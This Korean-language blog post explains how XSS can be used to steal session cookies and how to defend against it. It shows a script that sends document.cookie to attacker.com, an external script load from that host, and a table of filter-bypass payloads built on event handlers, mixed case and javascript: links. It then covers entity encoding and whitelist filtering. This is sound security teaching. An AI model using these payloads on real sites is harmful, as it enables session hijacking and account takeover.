---
layout: post
title: "Cookie 탈취와 XSS 공격 – 원리와 예제 정리"
date: 2025-06-22 10:00:00 +0900
categories: [XSS]
tags: [XSS, Cookie, HTML Entity, 스크립트 우회]
---


## **Cookie 탈취**
1. 쿠키는 사용자의 인증 정보를 담고 있어, 이를 탈취하면 세션을 가로채어 로그인 없이도 해당 사용자로 가장할 수 있습니다.  
2. 하지만 이 쿠키는 **도메인 단위로 격리**되어 있기 때문에, 아무 웹페이지에서나 다른 사이트의 쿠키를 훔치는 건 불가능합니다.

## **쿠키 탈취를 위한 XSS 스크립트 예제**
XSS(크로스 사이트 스크립팅) 취약점이 있는 웹사이트에 아래와 같은 스크립트를 삽입하면,  
사용자의 쿠키를 공격자 서버로 전송할 수 있습니다.

```html
<script>
  // ① 현재 사용자의 쿠키 정보를 읽어온다
  var cookieData = document.cookie;

  // ② 이미지를 요청하는 방식으로 공격자 서버에 쿠키를 전송
  var i = new Image();
  i.src = "http://attacker.com/" + cookieData;
</script>
```
1.	document.cookie 로 현재 페이지(도메인)의 쿠키를 읽습니다.
2.	new Image() 는 브라우저가 자동으로 이미지 요청을 보내도록 유도합니다.
3.	i.src 에 공격자 서버 주소 + 쿠키값을 붙여 요청을 날립니다.

결국:
```html
GET http://attacker.com/uid=abc123;sessionid=xyz
```
이런 식의 요청이 사용자 브라우저 → 공격자 서버로 전송됩니다.  
공격자는 서버 로그나 스크립트로 이 값을 수집할 수 있습니다.

## **XSS 대응 방안 (HTML Entity..)**

XSS 대응 방안으로 필터링이라고만 말하면 너무 광범위하기 때문에 올바른 대답이 아닙니다.  

대응방안은 크게 두가지로 나눠집니다.  
- 블랙리스트 기반 필터링
- 화이트리스트 기반 필터링

### 1. 블랙리스트 기반 필터링 : 특정 단어를 필터링 하는 방식(ex, 게시판)
- 특정 단어만 필터링하는 방식이기 때문에 우회 가능성이 있습니다.
    - 예시 : <br>

| 구분           | 기존 입력                            | 필터링 결과                | 우회 입력                                 |
|----------------|---------------------------------------|----------------------------|-------------------------------------------|
| 기본 XSS 삽입 시도  | `<script>BAD CODE</script>`   |  삽입 성공                      |
| 외부 JS 로드      | `<script src="http://attacker.com/a.js"></script>`                      | 외부에서 자바스크립트 파일을 불러와 실행     |
| 대소문자 혼용   | `<script>`                             | `<script>` 문구가 치환되거나 삭제될때          | `<ScRipT></ScrIpT>`                |
| 태그 제거 필터링   | `<script>`                           | `<>`                       | `<scrscriptipt>` (중간에 `script` 삽입)              |
| 태그 왜곡      | `<script>`                             | `xript` 글자가 바뀌어나옴       | `<img scr=x onerror=”alert(1)”>` <br> img "x" 출력 -> 없음 -> 404, not found 에러 → onerror -> 알람(1) 실행 |
| 이벤트 핸들러 사용   | `<img src=x onerror="alert(1)">`                     | 이미지 로드 실패 시 onerror로 코드 실행 |
|                    | `<input type="text" onmouseover="alert(1)">`         | 마우스 올리면 실행됨 |
|                    | `<input onfocus="alert(1)" autofocus>`               | 페이지 로드시 자동 포커스 후 실행 |
|                    | `<button onclick="alert(1)">Click</button>`          | 버튼 클릭 시 실행 |
| href(location.href)    | `<a href="**javascript:alert(1)**">TEST</a>`            | 링크 클릭 시 자바스크립트 실행 |
| 삽입한 값이 스크립트 내부에 있는 경우   | `<script> var data = “____”;  </script>`         | “;alert(1);  또는 var a = “ | `<script> var data = ““;alert(1);var dummy = “”; </script>` <br> `<script> var data = “var a = “”; </script>`


- - HTML 특수 문자를 HTML Entity로 치환  
    - XSS 공격을 막기 위해서는 <, >, ", ' 이 네 가지 특수문자를 HTML 엔티티로 바꿔주는 것으로 큰 효과가 있습니다. 
        - 하지만, 티스토리처럼 직접 HTML을 편집할 수 있는 에디터가 있는 경우에는, HTML 엔티티를 쓰면 오히려 제대로 입력이 안 되거나, 에디터가 깨질 수 있어서 사용할 수 없습니다.

그런 경우에는 아래의 단계들을 통해 XSS 공격을 효과적으로 방지할 수 있습니다.
1.	HTML Editor 기능 비활성화
    - 가능하다면 HTML 에디터 자체를 제거하거나 제한합니다.
2.	HTML 특수문자 전체 치환
	- 모든 사용자 입력에 대해 < > " ' 등의 특수문자를 HTML Entity로 변환합니다.
    - 예: `<img>` → `&lt;img&gt;`
3.	허용할 태그만 다시 복구 (화이트리스트 기반)
	- 꼭 필요한 태그들만 복원합니다.
    - 예: img, a, h1, h2, h3 등 허용 (이때 복원된 태그 외의 나머지 태그는 전부 무시되거나 차단됩니다.)
4.	복원된 태그 안의 이벤트 핸들러 필터링 (블랙리스트 기반)
	•	onerror, onload, onclick 같은 이벤트 핸들러 속성은 제거

### 2. 화이트 리스트 기반 필터링 : 특정 단어만 통과시키고 나머지는 모두 차단하는 방식
